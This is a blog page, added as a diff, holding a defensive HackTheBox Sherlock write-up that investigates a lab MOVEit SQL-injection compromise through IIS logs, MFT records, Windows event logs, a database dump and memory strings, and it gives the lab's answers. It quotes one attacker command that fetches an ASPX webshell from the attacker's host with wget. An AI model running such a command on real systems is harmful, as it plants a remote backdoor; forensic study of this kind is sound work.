@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>HTB i-like-to Writeup | buf0v3rfl0w</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="This is a HackTheBox Sherlock challenge, which is a new type of blue-team lab that HackTheBox introduced last month. These defensive security labs simulate real attack scenarios and require you to investigate in order to answer a series of questions about the incident.
+I want to preface by saying that I&rsquo;m no expert on blue-team techniques, and that&rsquo;s why I actually wanted to do this challenge in the first place. I&rsquo;m very interested in learning more about Digital Forensics and Incident Response (DFIR), and I&rsquo;m using these new Sherlock labs as part of that effort.">
+    <meta name="generator" content="Hugo 0.121.1">
+    
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+    
+
+    
+      
+<link rel="shortcut icon" href="/hacker_image.png" type="image/x-icon" />
+
+
+    
+
+    
+
+    
+      <link rel="canonical" href="https://bufoverflow.com/posts/htb-i-like-to-writeup/">
+    
+
+    <meta property="og:title" content="HTB i-like-to Writeup" />
+<meta property="og:description" content="This is a HackTheBox Sherlock challenge, which is a new type of blue-team lab that HackTheBox introduced last month. These defensive security labs simulate real attack scenarios and require you to investigate in order to answer a series of questions about the incident.
+I want to preface by saying that I&rsquo;m no expert on blue-team techniques, and that&rsquo;s why I actually wanted to do this challenge in the first place. I&rsquo;m very interested in learning more about Digital Forensics and Incident Response (DFIR), and I&rsquo;m using these new Sherlock labs as part of that effort." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bufoverflow.com/posts/htb-i-like-to-writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-22T00:08:38-05:00" />
+<meta property="article:modified_time" content="2023-12-22T00:08:38-05:00" />
+
+<meta itemprop="name" content="HTB i-like-to Writeup">
+<meta itemprop="description" content="This is a HackTheBox Sherlock challenge, which is a new type of blue-team lab that HackTheBox introduced last month. These defensive security labs simulate real attack scenarios and require you to investigate in order to answer a series of questions about the incident.
+I want to preface by saying that I&rsquo;m no expert on blue-team techniques, and that&rsquo;s why I actually wanted to do this challenge in the first place. I&rsquo;m very interested in learning more about Digital Forensics and Incident Response (DFIR), and I&rsquo;m using these new Sherlock labs as part of that effort."><meta itemprop="datePublished" content="2023-12-22T00:08:38-05:00" />
+<meta itemprop="dateModified" content="2023-12-22T00:08:38-05:00" />
+<meta itemprop="wordCount" content="1943">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HTB i-like-to Writeup"/>
+<meta name="twitter:description" content="This is a HackTheBox Sherlock challenge, which is a new type of blue-team lab that HackTheBox introduced last month. These defensive security labs simulate real attack scenarios and require you to investigate in order to answer a series of questions about the incident.
+I want to preface by saying that I&rsquo;m no expert on blue-team techniques, and that&rsquo;s why I actually wanted to do this challenge in the first place. I&rsquo;m very interested in learning more about Digital Forensics and Incident Response (DFIR), and I&rsquo;m using these new Sherlock labs as part of that effort."/>
+
+	
+
+  </head>
+
+  <body class="ma0 avenir bg-near-white">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-gray">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center" style="height: 125px;">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        <img src="/hacker_logo.png" class="w100 mw5-ns" alt="buf0v3rfl0w" />
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/about/" title="About Me page">
+              About Me
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/contact/" title="Contact page">
+              Contact
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/posts/" title="Posts page">
+              Posts
+            </a>
+          </li>
+          
+        </ul>
+      
+      
+<div class="ananke-socials">
+  
+    
+    <a href="https://twitter.com/buf0v3rfl0w" target="_blank" rel="noopener" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" aria-label="follow on Twitter——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+    
+    <a href="https://github.com/sdvickers98" target="_blank" rel="noopener" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+    
+    <a href="https://www.linkedin.com/in/dakota-vickers-90748a190/" target="_blank" rel="noopener" class="linkedin ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" aria-label="follow on LinkedIn——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 65 65;" version="1.1" viewBox="0 0 65 65"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <path d="M50.837,48.137V36.425c0-6.275-3.35-9.195-7.816-9.195  c-3.604,0-5.219,1.983-6.119,3.374V27.71h-6.79c0.09,1.917,0,20.427,0,20.427h6.79V36.729c0-0.609,0.044-1.219,0.224-1.655  c0.49-1.22,1.607-2.483,3.482-2.483c2.458,0,3.44,1.873,3.44,4.618v10.929H50.837z M22.959,24.922c2.367,0,3.842-1.57,3.842-3.531  c-0.044-2.003-1.475-3.528-3.797-3.528s-3.841,1.524-3.841,3.528c0,1.961,1.474,3.531,3.753,3.531H22.959z M34,64  C17.432,64,4,50.568,4,34C4,17.431,17.432,4,34,4s30,13.431,30,30C64,50.568,50.568,64,34,64z M26.354,48.137V27.71h-6.789v20.427  H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3" style="max-width: 1200px;">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Posts
+      </aside>
+      
+
+
+
+
+
+
+
+
+
+
+  <div id="sharing" class="mt3 ananke-socials">
+    
+      
+      <a href="https://twitter.com/intent/tweet?url=https://bufoverflow.com/posts/htb-i-like-to-writeup/&amp;text=HTB%20i-like-to%20Writeup" class="ananke-social-link twitter no-underline" aria-label="share on Twitter">
+        
+        <span class="icon"> <svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+        
+      </a>
+    
+      
+      <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://bufoverflow.com/posts/htb-i-like-to-writeup/&amp;title=HTB%20i-like-to%20Writeup" class="ananke-social-link linkedin no-underline" aria-label="share on LinkedIn">
+        
+        <span class="icon"> <svg style="enable-background:new 0 0 65 65;" version="1.1" viewBox="0 0 65 65"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <path d="M50.837,48.137V36.425c0-6.275-3.35-9.195-7.816-9.195  c-3.604,0-5.219,1.983-6.119,3.374V27.71h-6.79c0.09,1.917,0,20.427,0,20.427h6.79V36.729c0-0.609,0.044-1.219,0.224-1.655  c0.49-1.22,1.607-2.483,3.482-2.483c2.458,0,3.44,1.873,3.44,4.618v10.929H50.837z M22.959,24.922c2.367,0,3.842-1.57,3.842-3.531  c-0.044-2.003-1.475-3.528-3.797-3.528s-3.841,1.524-3.841,3.528c0,1.961,1.474,3.531,3.753,3.531H22.959z M34,64  C17.432,64,4,50.568,4,34C4,17.431,17.432,4,34,4s30,13.431,30,30C64,50.568,50.568,64,34,64z M26.354,48.137V27.71h-6.789v20.427  H26.354z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span>
+        
+      </a>
+    
+  </div>
+
+
+      <h1 class="f1 athelas mt3 mb1">HTB i-like-to Writeup</h1>
+      
+      <p class="tracked">
+        By <strong>Dakota Vickers</strong>
+      </p>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2023-12-22T00:08:38-05:00">December 22, 2023</time>
+      
+
+      
+      
+        <span class="f6 mv4 dib tracked"> - 10 minutes read </span>
+        <span class="f6 mv4 dib tracked"> - 1943 words </span>
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links dark-gray pr4-l w-two-thirds-l"><p>This is a HackTheBox Sherlock challenge, which is a new type of blue-team lab that HackTheBox introduced last month. These defensive security labs simulate real attack scenarios and require you to investigate in order to answer a series of questions about the incident.</p>
+<p>I want to preface by saying that I&rsquo;m no expert on blue-team techniques, and that&rsquo;s why I actually wanted to do this challenge in the first place. I&rsquo;m very interested in learning more about Digital Forensics and Incident Response (DFIR), and I&rsquo;m using these new Sherlock labs as part of that effort.</p>
+<p>We&rsquo;re given the following scenario:</p>
+<blockquote>
+<p>We have unfortunately been hiding under a rock and did not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker &amp; retrieve some details so we can implement them into our SOC environment. We have provided you with a triage of all the necessary artifacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here&hellip;</p>
+</blockquote>
+<h2 id="questions">Questions</h2>
+<ol>
+<li>What is the name of the ASPX webshell uploaded by the attacker?</li>
+<li>What was the attacker&rsquo;s IP address?</li>
+<li>What user agent was used to perform the initial attack?</li>
+<li>When was the ASPX webshell uploaded by the attacker?</li>
+<li>The attacker uploaded an ASP webshell which didn&rsquo;t work, what is its filesize in bytes?</li>
+<li>Which tool did the attacker use to initially enumerate the vulnerable server?</li>
+<li>We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC).</li>
+<li>Which protocol did the attacker utilize to remote into the compromised machine?</li>
+<li>Please confirm the date and time the attacker remotely accessed the compromised machine.</li>
+<li>What was the useragent that the attacker used to access the webshell?</li>
+<li>What is the inst ID of the attacker?</li>
+<li>What command was run by the attacker to retrieve the webshell?</li>
+<li>What was the string within the title header of the webshell deployed by the TA?</li>
+<li>What did the TA change our moveitsvc account password to?</li>
+</ol>
+<h2 id="moveit-transfer-critical-vulnerability">MOVEit Transfer Critical Vulnerability</h2>
+<p>Earlier this year, <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34362">CVE-2023-34362</a> was published. This is a critical SQL Injection vulnerability in the MOVEit file transfer software that can give access to the database and even provide Remote Code Execution (RCE) in some scenarios. You can find a proof-of-concept for this exploit <a href="https://github.com/horizon3ai/CVE-2023-34362">here</a>.</p>
+<h2 id="provided-files">Provided Files</h2>
+<p>We&rsquo;re given a memory dump (vmem file), but the &ldquo;client&rdquo; mentions that they forget to include the vmss file, which means we probably won&rsquo;t be able to do memory analysis with a tool like Volatility. We are provided with a hint to go &ldquo;back to basics&rdquo;, but we&rsquo;ll get to that later.</p>
+<p>We are also given a zip file containing output from the Kroll Artifact Parser and Extractor (KAPE), a tool which collects forensic artifacts from the filesystem. Here&rsquo;s a list of some of the important files KAPE provided that we&rsquo;ll need to solve the challenge:</p>
+<ul>
+<li><code>log.json</code> shows everything that was collected</li>
+<li><code>requests.json</code> contains metadata about the collected files</li>
+<li><code>uploads/</code> contains most of the files we&rsquo;re going to look at
+<ul>
+<li><code>moveit.sql</code> is a dump of the database</li>
+<li><code>auto/</code> contains some important log files
+<ul>
+<li>Microsoft IIS logs (<code>auto/C%3A/inetpub/logs/LogFiles/W3SVC2/u_ex230712.log</code>)</li>
+<li>Windows event logs (<code>auto/C%3A/Windows/System32/winevt/Logs/</code>)</li>
+</ul>
+</li>
+<li><code>ntfs/</code> has some other useful files, most importantly the MFT
+<ul>
+<li>Master File Table (MFT) (<code>ntfs/%5C%5C.%5CC%3A/$MFT</code>)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="starting-the-hunt">Starting the Hunt</h2>
+<p>Since the attack used SQL injection against a web server, we should start with the IIS logs.</p>
+<p><strong>Note:</strong> I&rsquo;m trying to improve my Powershell skills, so I&rsquo;ll be using that for <em>most</em> of the command line operations in this writeup. All of these techniques can be done easily with equivalent commands in a bash shell.</p>
+<p><img src="/images/iliketo/IIS_log.png" alt="IIS logs"></p>
+<p>We&rsquo;ll use Powershell to take a look at the <code>cs-uri-stem</code> column, which contains the request paths. First we use <code>Get-Content</code> to print the contents of the file, then <code>Foreach</code> with a <code>-split</code> command to get the values in the <code>cs-uri-stem</code> column. Finally, we pipe that into <code>Group-Object</code> to get a count for each unique value in the column.</p>
+<p><img src="/images/iliketo/IIS_request_paths.png" alt="request paths">
+<img src="/images/iliketo/final_requests.png" alt="final requests"></p>
+<p>The second picture above shows that the final few requests in the log are to <code>/moveit.asp</code> and <code>/move.aspx</code>. It&rsquo;s probably safe to say that these are the webshells that the attacker attempted to upload. Question #1 asks for the ASPX webshell used by the attacker, so the answer is <code>move.aspx</code>.</p>
+<p>We can change the command slightly to see the client-ip column.</p>
+<p><img src="/images/iliketo/IIS_clientIP.png" alt="client IP"></p>
+<p>The IP address <code>10.255.254.3</code> seems responsible for most of the traffic here, so that is likely the attacker&rsquo;s IP address and the answer to #2.</p>
+<p>Let&rsquo;s look at the cs(User-Agent) column to see what user agents were used, since that is related to #3.</p>
+<p><img src="/images/iliketo/user_agents.png" alt="user agents"></p>
+<p>Hmm, the user agent &ldquo;Ruby&rdquo; is used quite a lot, but let&rsquo;s do some more digging. Using <a href="https://www.kroll.com/en/insights/publications/cyber/moveit-vulnerability-investigations-uncover-additional-exfiltration-method">this article</a> as a reference, we can determine if this user agent was used for requests typically associated with this vulnerability.</p>
+<p><img src="/images/iliketo/finding_user_agent.png" alt="finding user agent"></p>
+<p>The requests shown above are artifacts common to attacks using CVE-2023-34362, and they were made with the &ldquo;Ruby&rdquo; user agent, so that is our answer to #3. This also hints that the attacker may have used Metasploit to conduct the attack since Metasploit modules are written in the Ruby programming language.</p>
+<p>#4 wants us to find the date and time that the ASPX webshell was uploaded by the attacker. We can find this easily since we already know that the webshell&rsquo;s name is <code>move.aspx</code>, but we won&rsquo;t find this information in the IIS logs. Instead, we need to look at the $MFT file. I recommend Eric Zimmerman&rsquo;s <a href="https://www.sans.org/tools/mftexplorer/">MFTExplorer</a> tool for this. Just a warning, it takes quite a long time for this tool to load up an MFT file. You can also use Zimmerman&rsquo;s MFTECmd command line tool if you don&rsquo;t want to use a GUI, and you can find it on <a href="https://ericzimmerman.github.io/#!index.md">this page</a>.</p>
+<p>After loading the MFT file into MFTExplorer, we can see a folder called <code>MOVEitTransfer/</code>.</p>
+<p><img src="/images/iliketo/mftexplorer.png" alt="mftexplorer"></p>
+<p>Investigating the <code>MOVEitTransfer/wwwroot/</code> folder, we see the two webshells that the attacker uploaded.</p>
+<p><img src="/images/iliketo/mftwebshells.png" alt="mftexplorer webshells"></p>
+<p>You can see from the image above that the ASPX webshell was uploaded on 2023-07-12 at 11:24:30. So, the answer to #4, in the format requested by HTB, is &ldquo;12/07/2023 11:24:30&rdquo;.</p>
+<p>#5 wants us to find the filesize, in bytes, of the ASP webshell that didn&rsquo;t work, aka the <code>moveit.asp</code> file. We can find this info in MFTExplorer</p>
+<p><img src="/images/iliketo/aspsize.png" alt="asp size"></p>
+<p>The size is given in hexadecimal, but we can easily convert this to decimal: <code>0x552</code> → <code>1362</code> bytes.</p>
+<p>Question #7 is next (the questions are mislabeled on the HTB page, and go straight from #5 to #7). It asks which tool the attacker used for enumeration. If you&rsquo;ve been paying attention, you&rsquo;ll remember that we got a clue about this when viewing the IIS logs.</p>
+<p><img src="/images/iliketo/nmap.png" alt="nmap"></p>
+<p>We see that an nmap user agent was used quite a lot at the beginning of the IIS logs, so &ldquo;nmap&rdquo; is the answer.</p>
+<p>#8 asks us when the attacker changed the password for the service account. We can find this information in the Windows event logs. I&rsquo;m going to use the Windows Event Viewer to find this, as I&rsquo;m not yet very familiar other tools that can be used for this purpose, like <a href="https://github.com/WithSecureLabs/chainsaw">Chainsaw</a>, but the event viewer is certainly not the most efficient method. Anyways, if you&rsquo;re looking for the specific log file that contains this answer, it&rsquo;s titled <code>Security</code>. In event viewer, you can easily filter for specific event IDs, and the ID for a password change event is 4724.</p>
+<p><img src="/images/iliketo/passchange.png" alt="password change"></p>
+<p>Since I&rsquo;m viewing this in event viewer, it automatically converts the events to my timezone, so I&rsquo;ll need to convert that back to UTC: 7:09:27 → 11:09:27. This is the only time the <code>moveitsvc</code> account changes it&rsquo;s own password, and the timestamp lines up with when we know the attack took place. So, the answer to #8 is <code>12/07/2023 11:09:27</code>.</p>
+<p>We can use the same log file to find the answer to #9, which asks for the protocol used by the attacker to remote into the compromised machine. It&rsquo;s a safe bet that the attacker used the <code>moveitsvc</code> account that they changed the password for, so we&rsquo;ll look for log entries around that same timestamp. We can filter for login events by looking for events with the ID 4624.</p>
+<p><img src="/images/iliketo/rdp.png" alt="rdp"></p>
+<p>We see that a user logged in to the service account just a couple of minutes after the password was changed. By referencing Microsoft&rsquo;s <a href="https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types">guide</a> on different logon types, we see that logon type 10 is used for users logging in with the Remote Desktop Protocol (RDP). This is the answer to #9.</p>
+<p>Converting the time to UTC again, we also get the answer to #10, which asks when the attacker remotely accessed the machine: <code>12/07/2023 11:11:18</code>.</p>
+<p>Going back to the IIS logs will help us find the user agent used to access the webshell, the answer to #11.</p>
+<p><img src="/images/iliketo/number11.png" alt="number 11"></p>
+<p>The user agent is <code>Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0</code>.</p>
+<p>To get the answer to #12, the inst ID of the attacker, we need to look at the database dump. I really tried to find a good way to do this with Powershell (I&rsquo;m sure there&rsquo;s one out there), but after a some trial and error I decided to bite the bullet and do this in a bash shell using <code>grep</code> and <code>sed</code> since I&rsquo;m more familiar with that.</p>
+<p>First, let&rsquo;s check out what tables are available.</p>
+<p><img src="/images/iliketo/tables.png" alt="tables"></p>
+<p>There are quite a few tables, but our best bet is to look at the &ldquo;log&rdquo; table. Let&rsquo;s look at the structure of the table.</p>
+<p><img src="/images/iliketo/logtable.png" alt="log table"></p>
+<p>It looks like this table does contain the InstID value, but the insert statements are a bit of a mess. Let&rsquo;s make them easier to look at with <code>sed</code>, then use <code>grep</code> to get entries on the day of the attack.</p>
+<p><img src="/images/iliketo/instid.png" alt="instid"></p>
+<p>We see several log entries using the &ldquo;Ruby&rdquo; user agent, which we know was used during the attack. They all have the same InstID, 1234, so that is the answer to #12.</p>
+<p>To answer the last 3 questions, we need to finally look at the provided memory dump. Remember the hint about getting &ldquo;back to basics&rdquo;, well we&rsquo;re going to do just that by looking at the file using <code>strings</code>.</p>
+<p><img src="/images/iliketo/strings.png" alt="strings"></p>
+<p>Question #13 asks what command was run to retrieve the webshell. We know the webshell is called <code>move.aspx</code>, so we&rsquo;ll use <code>grep</code> to search the strings file and <code>sort</code> to filter out duplicates.</p>
+<p><img src="/images/iliketo/question13.png" alt="question13"></p>
+<p>It looks like the attacker used <code>wget</code> to retrieve the webshell. The answer to #13 is <code>wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx</code>.</p>
+<p>Next, we need to find the string within the title header of the deployed webshell. The output of the previous command contained some HTML, which might be related to the request for the webshell.</p>
+<p><img src="/images/iliketo/html.png" alt="html"></p>
+<p>We can use the <code>grep</code> options <code>-A</code> and <code>-B</code> to get the lines before and after, like so</p>
+<p><img src="/images/iliketo/title.png" alt="title"></p>
+<p>So the answer to #14 is &ldquo;awen asp.net webshell&rdquo;. A quick google search for &ldquo;awen webshell&rdquo; gives <a href="https://github.com/SecWiki/WebShell-2/blob/master/Aspx/awen%20asp.net%20webshell.aspx">this</a> result, so this answer makes sense.</p>
+<p>The final question asks what the attacker changed the service account&rsquo;s password to. The attacker likely used the <code>net user</code> command to do this, so let&rsquo;s search for that.</p>
+<p><img src="/images/iliketo/newpass.png" alt="newpass"></p>
+<p>So, the answer to the final question is &ldquo;5trongP4ssw0rd&rdquo;.</p>
+<p>Whew! That was a lot of learning for me, but it was a great experience to become more familiar with the DFIR process. I also learned quite a bit about Powershell, though it was nice to use the bash commands that I&rsquo;m more familiar with for the last few questions.</p>
+<p>Hope you enjoyed,</p>
+<p>Dakota Vickers</p>
+<ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-gray bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://bufoverflow.com/" >
+     buf0v3rfl0w 2023 
+  </a>
+    <div>
+<div class="ananke-socials">
+  
+    
+    <a href="https://twitter.com/buf0v3rfl0w" target="_blank" rel="noopener" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" aria-label="follow on Twitter——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
